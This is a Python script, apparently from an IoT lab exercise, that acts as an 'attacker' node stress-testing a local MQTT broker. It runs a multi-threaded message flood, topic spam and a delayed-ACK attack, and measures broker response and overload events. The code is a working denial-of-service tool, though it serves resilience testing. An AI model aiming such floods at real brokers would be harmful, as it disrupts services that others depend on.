"""
Node C - Attacker/Stress Tester (IMPROVED VERSION)
Fitur Baru:
- Attack success/failure rate tracking
- System resilience metrics
- Attack impact measurement
- Detailed attack analytics
"""

import paho.mqtt.client as mqtt
import json
import time
import random
import threading
from datetime import datetime
from typing import Optional
from collections import deque

class NodeCImproved:
    def __init__(self):
        self.broker = "localhost"
        self.port = 1883
        self.clients = []
        self.running = True
        self.attack_active = False
        self.attack_stopping = False
        self.lock = threading.Lock()
        self.attack_threads = []
        
        # Attack statistics
        self.total_messages_sent = 0
        self.total_messages_failed = 0
        self.messages_per_second = 0
        self.topics_created = 0
        self.attack_duration = 0
        self.attack_start_time = None
        
        # NEW: Attack success tracking
        self.attack_success_rate = 100.0
        self.messages_acknowledged = 0
        self.messages_dropped = 0
        
        # NEW: System resilience metrics
        self.broker_response_times = deque(maxlen=100)
        self.avg_broker_response_time = 0
        self.broker_overload_events = 0
        
        # NEW: Attack impact tracking
        self.peak_attack_rate = 0
        self.sustained_attack_rate = deque(maxlen=60)  # Last 60 seconds
        self.attack_history = []
        
        # Attack configuration - HIGH INTENSITY for stress testing
        self.flood_rate = 10000  # messages per second (stress test)
        self.num_threads = 10
        self.spam_topics_count = 100
        
        # Topics
        self.topic_status = "/nodeC/attack_status"
        self.topic_metrics = "/nodeC/attack_metrics"
        self.main_client: Optional[mqtt.Client] = None
        
    def on_connect(self, client, userdata, flags, rc):
        """Callback saat koneksi berhasil"""
        if rc == 0:
            print(f"[Node C] ✅ Attack client connected (rc={rc})")
        else:
            print(f"[Node C] ❌ Connection failed with code {rc}")
    
    def on_publish(self, client, userdata, mid):
        """Callback saat publish berhasil"""
        with self.lock:
            self.total_messages_sent += 1
            self.messages_acknowledged += 1
            self._update_success_rate()
    
    def _update_success_rate(self):
        """Update attack success rate"""
        total_attempted = self.total_messages_sent + self.total_messages_failed
        if total_attempted > 0:
            self.attack_success_rate = (self.total_messages_sent / total_attempted) * 100
    
    def connect_main_client(self) -> bool:
        """Koneksi client utama untuk status"""
        try:
            self.main_client = mqtt.Client(
                client_id=f"node_c_main_{int(time.time())}",
                callback_api_version=mqtt.CallbackAPIVersion.VERSION1
            )
            self.main_client.on_connect = self.on_connect
            self.main_client.on_publish = self.on_publish
            
            print(f"[Node C] 🔌 Connecting to {self.broker}:{self.port}...")
            self.main_client.connect(self.broker, self.port, keepalive=60)
            self.main_client.loop_start()
            
            time.sleep(2)
            return True
        except Exception as e:
            print(f"[Node C] ❌ Connection error: {e}")
            return False
    
    def publish_attack_status(self, status: str, details: dict):
        """Publish status serangan"""
        if self.main_client:
            payload = {
                "node": "C",
                "status": status,
                "details": details,
                "total_messages": self.total_messages_sent,
                "messages_per_second": self.messages_per_second,
                "topics_created": self.topics_created,
                "attack_duration": self.attack_duration,
                "timestamp": datetime.now().isoformat()
            }
            try:
                self.main_client.publish(self.topic_status, json.dumps(payload), qos=0)
            except Exception as e:
                print(f"[Node C] ❌ Publish status error: {e}")
    
    def publish_attack_metrics(self):
        """Publish detailed attack metrics"""
        if self.main_client:
            avg_sustained_rate = sum(self.sustained_attack_rate) / len(self.sustained_attack_rate) \
                if self.sustained_attack_rate else 0
            
            payload = {
                "node": "C",
                "attack_performance": {
                    "success_rate": round(self.attack_success_rate, 2),
                    "messages_sent": self.total_messages_sent,
                    "messages_failed": self.total_messages_failed,
                    "messages_acknowledged": self.messages_acknowledged,
                    "messages_dropped": self.messages_dropped
                },
                "attack_intensity": {
                    "current_rate": self.messages_per_second,
                    "peak_rate": self.peak_attack_rate,
                    "avg_sustained_rate": round(avg_sustained_rate, 2),
                    "duration": self.attack_duration
                },
                "system_impact": {
                    "avg_broker_response": round(self.avg_broker_response_time * 1000, 2),  # ms
                    "overload_events": self.broker_overload_events,
                    "topics_created": self.topics_created
                },
                "timestamp": datetime.now().isoformat()
            }
            try:
                self.main_client.publish(self.topic_metrics, json.dumps(payload), qos=0)
            except Exception as e:
                print(f"[Node C] ❌ Publish metrics error: {e}")
    
    def flood_attack_worker(self, worker_id: int, messages_per_worker: int):
        """Worker thread untuk flood attack dengan metrics"""
        client = None
        try:
            # Buat client untuk worker ini
            client = mqtt.Client(
                client_id=f"attacker_{worker_id}_{int(time.time())}",
                callback_api_version=mqtt.CallbackAPIVersion.VERSION1
            )
            
            response_start = time.time()
            client.connect(self.broker, self.port, keepalive=60)
            response_time = time.time() - response_start
            
            with self.lock:
                self.broker_response_times.append(response_time)
                self.avg_broker_response_time = sum(self.broker_response_times) / len(self.broker_response_times)
                
                # Detect broker overload (slow response)
                if response_time > 1.0:
                    self.broker_overload_events += 1
            
            client.loop_start()
            
            print(f"[Node C] ⚔️ Attack worker {worker_id} started (target: {messages_per_worker} msg/s)")
            
            messages_sent = 0
            start_time = time.time()
            
            while self.attack_active and self.running and not self.attack_stopping:
                # Publish flood messages
                for _ in range(messages_per_worker):
                    if not self.attack_active or self.attack_stopping:
                        break
                    
                    topic = f"/attack/flood/worker_{worker_id}"
                    payload = {
                        "worker": worker_id,
                        "seq": messages_sent,
                        "data": "x" * 100,
                        "timestamp": time.time()
                    }
                    
                    try:
                        # Count attempted message first
                        messages_sent += 1
                        with self.lock:
                            self.total_messages_sent += 1
                        
                        result = client.publish(topic, json.dumps(payload), qos=0)
                        if result.rc == mqtt.MQTT_ERR_SUCCESS:
                            with self.lock:
                                self.messages_acknowledged += 1
                                self._update_success_rate()
                        else:
                            with self.lock:
                                self.total_messages_failed += 1
                                self.messages_dropped += 1
                                self._update_success_rate()
                    except Exception as e:
                        with self.lock:
                            self.total_messages_failed += 1
                            self._update_success_rate()
                
                # Control rate - check stop flag lebih sering
                elapsed = time.time() - start_time
                if elapsed < 1.0:
                    sleep_time = 1.0 - elapsed
                    # Sleep dalam chunks kecil agar bisa cepat respond ke stop
                    while sleep_time > 0 and self.attack_active and not self.attack_stopping:
                        time.sleep(min(0.1, sleep_time))
                        sleep_time -= 0.1
                
                start_time = time.time()
            
            if client:
                client.loop_stop()
                client.disconnect()
            print(f"[Node C] ✅ Attack worker {worker_id} stopped (sent: {messages_sent} messages)")
            
        except Exception as e:
            print(f"[Node C] ❌ Worker {worker_id} error: {e}")
            with self.lock:
                self.broker_overload_events += 1
        finally:
            if client:
                try:
                    client.loop_stop()
                    client.disconnect()
                except:
                    pass
    
    def topic_spam_attack(self):
        """Spam banyak topic berbeda dengan tracking"""
        try:
            client = mqtt.Client(
                client_id=f"spam_attacker_{int(time.time())}",
                callback_api_version=mqtt.CallbackAPIVersion.VERSION1
            )
            client.connect(self.broker, self.port, keepalive=60)
            client.loop_start()
            
            print(f"[Node C] 🗂️ Topic spam attack started (creating {self.spam_topics_count} topics)")
            
            successful_topics = 0
            failed_topics = 0
            
            for i in range(self.spam_topics_count):
                if not self.attack_active or not self.running:
                    break
                
                topic = f"/spam/{i}"
                payload = {
                    "spam_id": i,
                    "data": random.choice(["A", "B", "C", "D"]) * 50,
                    "timestamp": time.time()
                }
                
                try:
                    result = client.publish(topic, json.dumps(payload), qos=0)
                    if result.rc == mqtt.MQTT_ERR_SUCCESS:
                        with self.lock:
                            self.topics_created += 1
                        successful_topics += 1
                    else:
                        failed_topics += 1
                except:
                    failed_topics += 1
                
                time.sleep(0.01)
            
            print(f"[Node C] ✅ Topic spam completed (success: {successful_topics}, failed: {failed_topics})")
            
            client.loop_stop()
            client.disconnect()
            
        except Exception as e:
            print(f"[Node C] ❌ Topic spam error: {e}")
    
    def delayed_ack_attack(self):
        """Simulasi delayed ACK dengan tracking"""
        try:
            client = mqtt.Client(
                client_id=f"delayed_ack_{int(time.time())}",
                callback_api_version=mqtt.CallbackAPIVersion.VERSION1
            )
            
            ack_delays = []
            
            def on_message(client, userdata, msg):
                delay = random.uniform(0.5, 2.0)
                ack_delays.append(delay)
                time.sleep(delay)
            
            client.on_message = on_message
            client.connect(self.broker, self.port, keepalive=60)
            client.subscribe("/test/#", qos=2)
            client.loop_start()
            
            print(f"[Node C] ⏱️ Delayed ACK attack started")
            
            count = 0
            while self.attack_active and self.running and count < 1000:
                topic = f"/test/delayed_ack/{count}"
                payload = {
                    "seq": count,
                    "data": "x" * 200,
                    "timestamp": time.time()
                }
                
                try:
                    client.publish(topic, json.dumps(payload), qos=2)
                    count += 1
                except:
                    pass
                
                time.sleep(0.1)
            
            avg_delay = sum(ack_delays) / len(ack_delays) if ack_delays else 0
            print(f"[Node C] ✅ Delayed ACK completed ({count} messages, avg delay: {avg_delay:.2f}s)")
            
            client.loop_stop()
            client.disconnect()
            
        except Exception as e:
            print(f"[Node C] ❌ Delayed ACK error: {e}")
    
    def monitor_attack_stats(self):
        """Monitor dan report statistik serangan"""
        print("[Node C] 📊 Attack statistics monitor started")
        
        last_count = 0
        
        while self.running:
            time.sleep(1)
            
            if self.attack_active:
                with self.lock:
                    current_count = self.total_messages_sent
                    self.messages_per_second = current_count - last_count
                    last_count = current_count
                    self.attack_duration += 1
                    
                    # Track sustained rate
                    self.sustained_attack_rate.append(self.messages_per_second)
                    
                    # Update peak rate
                    if self.messages_per_second > self.peak_attack_rate:
                        self.peak_attack_rate = self.messages_per_second
                
                print(f"\n[Node C] ⚔️ ATTACK STATS:")
                print(f"  → Rate: {self.messages_per_second:,} msg/s")
                print(f"  → Total Sent: {self.total_messages_sent:,} messages")
                print(f"  → Acknowledged: {self.messages_acknowledged:,} messages")
                print(f"  → Success Rate: {self.attack_success_rate:.1f}%")
                print(f"  → Duration: {self.attack_duration}s")
                
                self.publish_attack_status("attacking", {
                    "rate": self.messages_per_second,
                    "duration": self.attack_duration
                })
                
                # Publish metrics every 5 seconds
                if self.attack_duration % 5 == 0:
                    self.publish_attack_metrics()
    
    def start_attack(self, attack_type: str = "all"):
        """Start serangan dengan tracking"""
        # Check jika masih ada attack running
        if self.attack_active or self.attack_stopping:
            print("[Node C] ⚠️ Previous attack still stopping, please wait...")
            return []
        
        print("\n" + "=" * 70)
        print(f"[Node C] 🚀 Starting {attack_type.upper()} attack...")
        print("=" * 70 + "\n")
        
        with self.lock:
            self.attack_active = True
            self.attack_stopping = False
            self.total_messages_sent = 0
            self.total_messages_failed = 0
            self.messages_per_second = 0
            self.topics_created = 0
            self.attack_duration = 0
            self.attack_start_time = time.time()
            self.messages_acknowledged = 0
            self.messages_dropped = 0
            self.peak_attack_rate = 0
            self.sustained_attack_rate.clear()
            self.attack_threads.clear()
        
        threads = []
        
        if attack_type in ["flood", "all"]:
            messages_per_worker = self.flood_rate // self.num_threads
            for i in range(self.num_threads):
                t = threading.Thread(
                    target=self.flood_attack_worker,
                    args=(i, messages_per_worker),
                    daemon=True
                )
                threads.append(t)
                self.attack_threads.append(t)
                t.start()
        
        if attack_type in ["spam", "all"]:
            t = threading.Thread(target=self.topic_spam_attack, daemon=True)
            threads.append(t)
            self.attack_threads.append(t)
            t.start()
        
        if attack_type in ["delayed", "all"]:
            t = threading.Thread(target=self.delayed_ack_attack, daemon=True)
            threads.append(t)
            self.attack_threads.append(t)
            t.start()
        
        if attack_type in ["delayed", "all"]:
            t = threading.Thread(target=self.delayed_ack_attack, daemon=True)
            threads.append(t)
            t.start()
        
        self.publish_attack_status("started", {"type": attack_type})
        
        return threads
    
    def stop_attack(self):
        """Stop serangan dengan summary"""
        print("\n[Node C] 🛑 Stopping attack...")
        with self.lock:
            self.attack_active = False
            self.attack_stopping = True
            
            # Save attack history
            attack_summary = {
                "start_time": datetime.fromtimestamp(self.attack_start_time).isoformat() if self.attack_start_time else None,
                "end_time": datetime.now().isoformat(),
                "duration": self.attack_duration,
                "total_sent": self.total_messages_sent,
                "total_failed": self.total_messages_failed,
                "success_rate": self.attack_success_rate,
                "peak_rate": self.peak_attack_rate,
                "topics_created": self.topics_created
            }
            self.attack_history.append(attack_summary)
        
        # Wait for threads to finish
        print("[Node C] ⏳ Waiting for attack threads to finish...")
        for t in self.attack_threads:
            t.join(timeout=1)  # Reduce dari 3s ke 1s
        self.attack_threads.clear()
        
        time.sleep(0.5)  # Reduce dari 1s ke 0.5s
        
        with self.lock:
            self.attack_stopping = False
        
        # Publish final metrics
        self.publish_attack_metrics()
        self.publish_attack_status("stopped", attack_summary)
        
        # Send idle status agar dashboard update
        time.sleep(0.2)
        self.publish_attack_status("idle", {"message": "Attack stopped, ready"})
        
        # Print attack summary
        print("\n" + "=" * 70)
        print("ATTACK SUMMARY")
        print("=" * 70)
        print(f"Duration: {self.attack_duration}s")
        print(f"Messages Sent: {self.total_messages_sent:,}")
        print(f"Messages Failed: {self.total_messages_failed:,}")
        print(f"Success Rate: {self.attack_success_rate:.2f}%")
        print(f"Peak Rate: {self.peak_attack_rate:,} msg/s")
        print(f"Avg Sustained Rate: {sum(self.sustained_attack_rate)/len(self.sustained_attack_rate):.2f} msg/s" if self.sustained_attack_rate else "")
        print(f"Topics Created: {self.topics_created}")
        print(f"Broker Overload Events: {self.broker_overload_events}")
        print("=" * 70 + "\n")
    
    def interactive_menu(self):
        """Menu interaktif untuk kontrol serangan"""
        print("\n" + "=" * 70)
        print("Node C - Attack Controller Menu (IMPROVED)")
        print("=" * 70)
        print("1. Start FLOOD Attack (10,000 msg/s)")
        print("2. Start TOPIC SPAM Attack")
        print("3. Start DELAYED ACK Attack")
        print("4. Start ALL Attacks")
        print("5. Stop Current Attack")
        print("6. Show Statistics")
        print("7. Show Attack History")
        print("0. Exit")
        print("=" * 70)
    
    def start(self):
        """Start Node C dengan auto-attack (tanpa menu)"""
        print("=" * 70)
        print("         💥 NODE C - ATTACK SIMULATOR (IMPROVED)")
        print("=" * 70)
        
        # Connect main client
        success = self.connect_main_client()
        if not success:
            print("[Node C] ❌ Failed to connect to broker!")
            return
        
        # Start monitor thread
        monitor_t = threading.Thread(target=self.monitor_attack_stats, daemon=True)
        monitor_t.start()
        
        self.publish_attack_status("ready", {"message": "Attack controller ready"})
        
        print("\n📊 New Features:")
        print("  - Attack success/failure tracking")
        print("  - System resilience measurement")
        print("  - Broker response time monitoring")
        print("  - Detailed attack analytics")
        print("\n⚔️  AUTO-ATTACK MODE: Will start flood attack automatically")
        print("    Press Ctrl+C to stop attack and exit\n")
        print("=" * 70 + "\n")
        
        # Wait 2 detik sebelum mulai attack
        print("[Node C] ⏳ Starting attack in 2 seconds...")
        time.sleep(2)
        
        # Start flood attack otomatis
        attack_threads = self.start_attack("flood")
        
        try:
            # Infinite loop - attack terus jalan sampai Ctrl+C
            while self.running:
                time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n[Node C] ⚠️ Ctrl+C detected - Stopping attack...")
        
        finally:
            print("\n[Node C] 🛑 Shutting down...")
            self.running = False
            if self.attack_active:
                self.stop_attack()
            
            if self.main_client:
                self.main_client.loop_stop()
                self.main_client.disconnect()
            
            print("[Node C] ✅ Stopped.")

if __name__ == "__main__":
    attacker = NodeCImproved()
    attacker.start()
